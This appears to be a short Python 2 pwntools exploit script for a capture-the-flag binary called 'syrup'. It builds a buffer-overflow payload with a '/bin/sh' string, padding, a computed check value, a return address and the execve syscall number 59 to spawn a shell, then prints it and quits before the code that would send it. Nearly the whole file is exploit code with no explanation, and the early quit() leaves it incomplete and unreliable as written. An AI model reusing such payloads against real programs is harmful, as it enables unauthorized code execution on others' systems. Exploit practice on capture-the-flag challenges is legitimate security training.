from pwn import *

padding = "/bin/sh\x00" + "A"*(0x400-len("/bin/sh\x00"))

good = p64(0xbeef ^ 0xdead)

step1 = padding + good  + "A"*8 +  p64(0x0000000000401004) + p64(59)
print step1
quit()

p = process("./syrup")
p.recvuntil("?\n")
p.sendline(padding + good)
print p.recvall()
